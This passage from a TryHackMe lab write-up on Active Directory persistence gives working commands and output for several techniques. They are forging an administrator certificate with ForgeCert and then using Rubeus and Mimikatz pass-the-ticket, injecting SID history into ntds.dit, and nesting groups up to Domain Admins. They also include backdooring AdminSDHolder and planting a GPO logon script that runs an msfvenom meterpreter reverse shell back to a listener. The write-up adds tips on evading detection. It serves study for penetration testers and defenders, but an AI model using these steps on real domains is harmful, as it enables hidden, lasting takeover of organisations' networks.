11/15/2022  05:37 AM             1,423 local_machine_My_0_.der
11/15/2022  05:37 AM             3,299 local_machine_My_0_.pfx
11/15/2022  05:37 AM               939 local_machine_My_1_za-THMDC-CA.der
11/15/2022  05:37 AM             2,685 local_machine_My_1_za-THMDC-CA.pfx
11/15/2022  05:37 AM             1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
11/15/2022  05:37 AM             3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
11/15/2022  05:37 AM             1,465 local_machine_My_3_.der
11/15/2022  05:37 AM             3,321 local_machine_My_3_.pfx
               8 File(s)         18,046 bytes
               2 Dir(s)  51,544,858,624 bytes free

```

__Generating our own Certificates__

Now we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool and generate our own certs.
```powershell
PS C:\Users\Administrator\h4x0r> C:\Tools\ForgeCert\ForgeCert\ForgeCert.exe --CaCertPath .\local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword m
imikatz --Subject 'CN=Pwned' --SubjectAltName 'Administrator@za.tryhackme.loc' --NewCertPath .\domain-admin.pfx --NewCertPassword pwned321      
CA Certificate Information:
  Subject:        CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Issuer:         CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Start Date:     4/27/2022 7:58:15 PM
  End Date:       4/27/2027 8:08:09 PM
  Thumbprint:     C12FCB4B88467854B3D4D7F762ADB50B0FD8346E
  Serial:         1EF93E3A3DA3249842EF04E3DA57E190

Forged Certificate Information:
  Subject:        CN=Pwned
  SubjectAltName: Administrator@za.tryhackme.loc
  Issuer:         CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
  Start Date:     11/15/2022 5:49:25 AM
  End Date:       11/15/2023 5:49:25 AM
  Thumbprint:     026D4C162A7C3A36465D27EFD47F2A7AAC354D5C
  Serial:         00E94EF8ADD196D0667C6DE8DC0A474738

Done. Saved forged certificate to .\domain-admin.pfx with the password 'pwned321'
```

Parameters explained:

-   **CaCertPath - The path to our exported CA certificate.**
-   **CaCertPassword** - The password used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
-   **Subject** - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
-   **SubjectAltName** - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
-   **NewCertPath** - The path to where ForgeCert will store the generated certificate.
-   **NewCertPassword** - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

```powershell
PS C:\Users\Administrator\h4x0r> C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:'.\domain-admin.pfx' /password:'pwned321' /outfile:domain-admin.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=Pwned  
[*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator' 
[+] TGT request successful! 
[*] base64(ticket.kirbi): 

      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

[*] Ticket written to domain-admin.kirbi


  ServiceName              :  krbtgt/za.tryhackme.loc
  ServiceRealm             :  ZA.TRYHACKME.LOC
  UserName                 :  Administrator
  UserRealm                :  ZA.TRYHACKME.LOC
  StartTime                :  11/15/2022 5:55:03 AM
  EndTime                  :  11/15/2022 3:55:03 PM
  RenewTill                :  11/22/2022 5:55:03 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  0kBT/6Rcd99ddz+4A/HpmgLNhbNYfzR1VMe9aIFmNFY=
  ASREP (key)              :  E8477D2B0ED9AD627FDB5D8943A05FA431FE275FD374A943906345A1A780A433

PS C:\Users\Administrator\h4x0r>

```

parameters:

-   **/user** - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
-   **/enctype** -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
-   **/certificate** - Path to the certificate we have generated
-   **/password** - The password for our certificate file
-   **/outfile** - The file where our TGT will be output to
-   **/domain** - The FQDN of the domain we are currently attacking
-   **/dc** - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

Now we can use Mimikatz to load the TGT and authenticate to THMDC:
```shell-session
S C:\Users\Administrator\h4x0r> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt domain-admin.kirbi

* File: 'domain-admin.kirbi': OK

mimikatz # exit
Bye!
PS C:\Users\Administrator\h4x0r>
```

Now view:
```shell-session
PS C:\Users\Administrator\h4x0r> dir \\thmdc.za.tryhackme.loc\C$\Users


    Directory: \\thmdc.za.tryhackme.loc\C$\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/15/2022   5:31 AM                Administrator
d-----        4/27/2022   8:22 AM                Administrator.TRYHACKME
d-r---        3/21/2020   8:25 PM                Public
d-----        3/21/2020   8:52 PM                vagrant

```

__We Are No Longer Friends With The Blue Team__

Certificate persistence is significantly harder to defend against. Even if you rotate the credentials of the compromised account, the certificate will still be valid. The only way to remove the persistence is to issue a revocation of the certificate. However, this would only be possible if we generated the certificate through legitimate channels. Since we exported the CA and generated the certificate ourselves, it does not appear on AD CS's list of issued certificates, meaning the blue team will not be able to revoke our certificate.

This is incredibly dangerous. The only way to recover in this situation is revoke the root CA, and therefore rebuild everything.

__Questions__

What key is used to sign certificates to prove their authenticity?
Answer: _Private Key_

What application can we use to forge a certificate if we have the CA certificate and private key?
Answer: _ForgeCert.exe_

What is the Mimikatz command to pass a ticket from a file with the name of ticket.kirbi?
Answer: _kerberos::ptt ticket.kirbi_


Task5 - Persistence through SID History
-----------------------------------------------

The SID are used to track the principal and account access when connecting to resources.

There is a SID history attribute which is interesting because it allows us to surogate someone elses access. This is a build in feature since it may be required for example to retain access while moving to other domains etc.  You could get the SID over the new domain, but retain the history of the old one, which would still allow you to access everything.

__History Can Be Whatever We Want It To Be__

If we have the proper permissions we can add any domain to an account we control.

* Need DA Privs
* When account creates a login event, the SID associated with it are added to the User's token, determining the privs for the user, including group SIDs.
* If we inject Enterprise Admin SID, we could gain DA in all domains in the forrest.
* When the SIDs are added to the user's token,  the privs are respected even if the user is not part of  the group. This is a very sneaky way because we can assign this to a normal user who can then control everything.

__Forging History__

Ok let's open a SSH session using Admin credentials:

```bash
 # ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.locadministrator@za.tryhackme.loc@thmdc.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\administrator@THMDC C:\Users\Administrator>powershell -ep bypass
Copyright (C) Microsoft Corporation. All rights reserved.
```

Now let's make sure our low priveleged user has no SID history:
```shell-session
PS C:\Users\Administrator> Get-ADUser 'barbara.reid' -Properties sidhistory,memb
erof


DistinguishedName : CN=barbara.reid,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=lo 
                    c
Enabled           : True
GivenName         : Barbara
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}    
Name              : barbara.reid
ObjectClass       : user
 
ObjectGUID        : ab5f2cb8-a247-4176-9631-29650d499a9d
SamAccountName    : barbara.reid
SID               : S-1-5-21-3885271727-2693558621-2658995185-1127
SIDHistory        : {}
Surname           : Reid
UserPrincipalName :
```

Ok our history is clean. Let's get the SID of the Domain Admins group because this is the one we want to add to our history:
```shell-session
PS C:\Users\Administrator> Get-ADGroup 'Domain Admins'


DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Global
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512

```

Mimikataz can be used to add SID history. There was a known bug which did not allow patching lsass to update SID history so we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to patch the ntds.dit file (ad database)

```shell-session
PS C:\Users\Administrator> Import-Module DSInternals
PS C:\Users\Administrator> Stop-Service ntds -Force 
PS C:\Users\Administrator> Add-ADDBSidHistory -SamAccountName 'barbara.reid' -Si
dHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Window
s\NTDS\ntds.dit
PS C:\Users\Administrator> Start-Service -Name ntds
```

Now login to THMWRK1 as our under-priv'd user and check:
```shell-session
# ssh za.tryhackme.loc\\barbara.reid@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\barbara.reid@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\barbara.reid@THMWRK1 C:\Users\barbara.reid>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\barbara.reid> Get-ADUser barbara.reid -Properties sidhistory 


DistinguishedName : CN=barbara.reid,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=lo 
                    c
Enabled           : True
GivenName         : Barbara
Name              : barbara.reid
ObjectClass       : user
ObjectGUID        : ab5f2cb8-a247-4176-9631-29650d499a9d
SamAccountName    : barbara.reid
SID               : S-1-5-21-3885271727-2693558621-2658995185-1127  
SIDHistory        : {S-1-5-21-3885271727-2693558621-2658995185-512} 
Surname           : Reid
UserPrincipalName :
```

Now let's see how it looks:
```shell-session
PS C:\Users\barbara.reid> dir \\thmdc.za.tryhackme.loc\c$


    Directory: \\thmdc.za.tryhackme.loc\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018   8:19 AM                PerfLogs
d-r---        5/11/2022  10:32 AM                Program Files
d-----        3/21/2020   8:28 PM                Program Files (x86)
d-----         7/6/2022   4:38 PM                tmp
da----        6/30/2022   2:58 PM                Tools
d-r---        4/27/2022   8:22 AM                Users
d----l        4/25/2022   7:11 PM                vagrant
d-----         7/3/2022   9:51 AM                Windows
-a----         1/4/2022   7:47 AM            103 delete-vagrant-user.ps1        
-a----         5/1/2022   9:11 AM            169 dns_entries.csv
-a----         7/3/2022   6:05 PM           7168 shell.exe
-a----         5/1/2022   9:17 AM           1725 thm-network-setup-dc.ps1       
```

It works!

__Pitchforks and Torches from the Blue Team__

You maybe able to view SID history with the highest credentials but you cannot remove it. You would have to use AD-RSAT PowerShell cmdlets.

You would have to find them. They don't just show up as a new Domain Admins. You need to sift through all the users' attributes. It's like finding a needle in a haystack.  This is because the SID history is only appied and used when a user authenticates.

__Questions__

What AD object attribute is normally used to specify SIDs from the object's previous domain to allow seamless migration to a new domain?
Answer: _SIDHistory_

What is the database file on the domain controller that stores all AD information?
Answer: _ntds.dit_

What is the PowerShell command to restart the ntds service after we injected our SID history values?
Answer: _Start-Service -Name ntds_


Task6 - Persistence through Group Membership
-----------------------------------------------------------

In this module we will take a look at persistence through Group Membership. Sometimes this is a better option if we want to want to mess around with SID histories.

__Persistence through Group Membership__

It is not best to just add yourself to the Domain Admins or Enterprise Admins groups, because those are closely monitored. Other groups which may act as a quick stepping stone such as Admins groups like IT-Administrators etc. might be a better choice.

* The IT Support Group may allow us to force password changes, but in most cases we won't be able to reset the password for Domain Admins. If we can reset even low level passwords however, we can spread out to other workstations and have more attack surface to explore.
* Local Administrator accounts can also be good and may not be so closely monitored.  If we have this and membership in a network support group we may easily gain DA again.
* Sometimes having lower level access with access to Group Policy Objects (GPOs) can be just as good.

__Nested Groups__

Most orgs have AD structered in groups. Something like:
IT Support
   * Helpdesk
   * Cardreaders
   * NetworkTeam
   * etc

While Adding a member directly to IT Support group may raise an alert, adding them to a sub-group may not raise alarm but give the same level of access AND be harder to find since sub-groups may have many nested sub-groups.  

Create 1st group People/IT OU:
```powershell
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "c0r Nest Group 1" -SamAccountName "c0r_nestgroup1" -DisplayName "c0r Nest Group 1" -GroupScope Global -GroupCategory Security
```

Create 2nd group People/Sales OU:
```powershell
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "c0r Nest Group 2" -SamAccountName "c0r_nestgroup2" -DisplayName "c0r Nest Group 2" -GroupScope Global -GroupCategory Security
```

Create 3rd group People/Consulting OU:
```powershell
New-ADGroup -Path "OU=CONSULTING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "c0r Nest Group 3" -SamAccountName "c0r_nestgroup3" -DisplayName "c0r Nest Group 3" -GroupScope Global -GroupCategory Security
```

Create 4th group People/Marketing OU:
```powershell
New-ADGroup -Path "OU=MARKETING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "c0r Nest Group 4" -SamAccountName "c0r_nestgroup4" -DisplayName "c0r Nest Group 4" -GroupScope Global -GroupCategory Security
```

Create 5th group People/IT OU:
```powershell
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "c0r Nest Group 5" -SamAccountName "c0r_nestgroup5" -DisplayName "c0r Nest Group 5" -GroupScope Global -GroupCategory Security
```

Now we nest the groups. 1st add Group 1 to Group 2:
```powershell
Add-ADGroupMember -Identity 'c0r_nestgroup2' -Members 'c0r_nestgroup1'
```

Add Group 2 to Group 3:
```powershell
Add-ADGroupMember -Identity 'c0r_nestgroup3' -Members 'c0r_nestgroup2'
```

Add Group 3 to Group 4:
```powershell
Add-ADGroupMember -Identity 'c0r_nestgroup4' -Members 'c0r_nestgroup3'
```

Add Group 4 to Group 5:
```powershell
Add-ADGroupMember -Identity 'c0r_nestgroup5' -Members 'c0r_nestgroup4'
```

Add Group 5 to Domain Admins Group:
```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members 'c0r_nestgroup5'
```

Add an unpriv'd user to Group 1:
```powershell
Add-ADGroupMember -Identity 'c0r_nestgroup1' -Members 'barbara.reid'
```


Now let's verify it worked. We can SSH into thmwrk1 as our unpriv'd user:
```shell-session
# ssh za.tryhackme.loc\\barbara.reid@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\barbara.reid@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.
```

Now see if it worked:
```shell-session
za\barbara.reid@THMWRK1 C:\Users\barbara.reid>dir \\thmdc.za.tryhackme.loc\c$\Us
ers
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows 
 Volume Serial Number is 1634-22A9

 Directory of \\thmdc.za.tryhackme.loc\c$\Users

04/27/2022  07:22 AM    <DIR>          .
04/27/2022  07:22 AM    <DIR>          ..
11/15/2022  05:47 PM    <DIR>          Administrator
04/27/2022  07:22 AM    <DIR>          Administrator.TRYHACKME 
03/21/2020  08:25 PM    <DIR>          Public
03/21/2020  08:52 PM    <DIR>          vagrant
               0 File(s)              0 bytes
               6 Dir(s)  51,510,902,784 bytes free

za\barbara.reid@THMWRK1 C:\Users\barbara.reid>
```

It works!

__Annoying More Than Just The Blue Team__

If this was a real org, we would probably never use this technique because it is likely to break the AD structure and dechain us. Even if the Blue team kicked us out at this point they would likely have to re-build everything from scratch.

__Questions__

What is the term used to describe AD groups that are members of other AD groups?
Answer: _Group Nesting_

What is the command to add a new member, thmtest, to the AD group, thmgroup?
Answer: _Add-ADGroupMember -Identity thmgroup -Members thmtest_


Task7 - Persistence through ACLs
-------------------------------------------------------

In this section we will go over how to persist through ACLs.

__Persisting through AD Group Templates__

This technique involve injection into the main templates. This way if the Blue Team cleans out our account, we just wait until the default templates are run again and we get access back automatically.

AdminSDHolder is one of these which persists in every AD domain and its ACL is used as a template to copy permissions to all protected groups. Some of these groups include:
* Domain Admins
* Administrators
* Enterprise Admins
* Schema Admins

There is a full list here:  [here](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)).

There is a process called SDProp which takes the ACL of the AdminSDHolder and copies it every 60 mins. So all we have to do is write an ACE  that grants us full perms on all protected groups. This type of persistence is hard to find if the Blue Team isn't aware of it as it is part of the normal process of reconstruction and it won't raise any alarms etc. Once every 60 mins it will put us back in the groups.

__Persisting with AdminSDHolder__

We will use Microsoft Management Console (MMC) to deploy persistence with AdminSDHolder.

We can avoid disruptions by logging into THMWRK1 as a normal user and then using runas Administrator to inject our Admin credentials and then execute MMC.

First let's RDP:
```bash
xfreerdp /u:barbara.reid /p:Password1 /cert:ignore /v:10.200.61.248 /smart-sizing:1600x1200
```

Now we can do runas in a powershell prompt:
```powershell
runas /netonly /user:za.tryhackme.loc\Administrator cmd.exe
```

This will give us a new cmd.exe prompt which we can run mmc.exe in:
```shell-session
C:\Windows\system32>mmc.exe

C:\Windows\system32>
```

Now we are running with the domain admin injected credentials.

Go to File > Add/Remove Snap-in. Add the Active Directory Users and Computers snap-in.

After adding it, drill down to the domain za.tryhackme.loc. Then with it selected, goto view > Advanced Features. This will enable us to see the other options we need under System > AdminSDHolder.

Right click on the Admin SDHolder option and choose properties.

Click the Security Tab, and Click Add to add a new user.

You want to now add your unprivileged user.
-   Click **Add**.
-   Search for your low-privileged username and click **Check Names**.
-   Click **OK**.
-   Click **Allow** on **Full Control**.
-   Click **Apply**.
-   Click **OK**.

Now you can just wait 60 mins and you have full access.

In this case we will use SD Prop invoked manually to speed up the process.

We use our existing cmd prompt (the one opened/injected with domain Administrator)

Open a powershell session:
```shell-session
powershell -ep bypass
```

Next we will WinRM to the domain controller as the DA:

```shell-session
Enter-PSSession -ComputerName thmdc.za.tryhackme.loc
```

Now we should be running in  powershell session on the domain controller. We can invoke the powershell cmdlet after import:
```powershell
Import-Module C:\Tools\Invoke-ADSDPropagation.ps1
Invoke-ADSDPropagation
```

Now by some magic of the command above or if we waited 60 mins we can test.

Let's test this now by adding our user account from the unprivileged user's Powershell window on THMWRK1.

```shell-session
PS C:\Tools> Add-ADGroupMember -Identity 'Domain Admins' -Members 'barbara.reid'
PS C:\Tools> Get-ADGroupMember -Identity 'Domain Admins' | Where-Object {$_.SamAccountName -eq 'barbara.reid'}

distinguishedName : CN=barbara.reid,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc
name              : barabara.reid
objectClass       : user
objectGUID        : ab5f2cb8-a247-4176-9631-29650d499a9d
SamAccountName    : barbara.reid
SID               : S-1-5-21-3885271727-2693558621-2658995185-1127
```

![[powershell1.png]]

Combining techniques like this with the previous one of nesting, would make for a mess of a cleanup.

__Questions__

What AD group's ACLs are used as a template for the ACLs of all Protected Groups?
Answer: _AdminSDHolder_

What AD service updates the ACLs of all Protected Groups to match that of the template?
Answer: _SDProp_

What ACL permission allows the user to perform any action on the AD object?
Answer: _Full Control_


Task8 - Persistence through GPOs
-------------------------------------------

Create reverse shell executable called $USER_shell.exe
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > c0r_shell.exe
```

Create a Batch script called $USER_script.bat
```bash
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\c0r_shell.exe C:\tmp\c0r_shell.exe && timeout /t 20 && C:\tmp\c0r_shell.exe
```

Now, we need to scp both of those files to the SYSVOL directory:
```bash
scp c0r_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ 

scp c0r_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Now, while we are at it, let's go ahead and start our listener so we don't forget:
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
```

Now let's RDP to THMWRK1:
```bash
xfreerdp /u:barbara.reid /p:Password1 /cert:ignore /v:10.200.61.248 /smart-sizing:1600x1200
```

Now we can do runas in a powershell prompt as Administrator:
```powershell
runas /netonly /user:za.tryhackme.loc\Administrator cmd.exe
```

This will give us a new cmd.exe prompt which we can run mmc.exe in:
```shell-session
C:\Windows\system32>mmc.exe

C:\Windows\system32>
```

Now we are running with the domain admin injected credentials.

Once we start mmc, we need to add the Group Management GPO Snap-in. 


Once we link our script to the Logon script process in the Group Policy Management Editor (under User Configuration -> Policies -> Windows Settings -> Scripts)

NOTE: When you are trying to find the script select the top line and then type in: `\\za.tryhackme.loc\SYSVOL\za.tryhackme.loc\scripts\`

After it's linked, we can wait for someone to login to trigger. But let's reset the password of a T1 admin and login as them and trigger it.

```powershell
PS C:> Add-ADGroupMember "IT Support" -Members "barbara.reid"
PS C:> Get-ADGroupMember -Identity "Tier 1 Admins"
PS C:> $Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
PS C:> Set-ADAccountPassword -Identity "t1_trevor.jones" -Reset -NewPassword $Password
```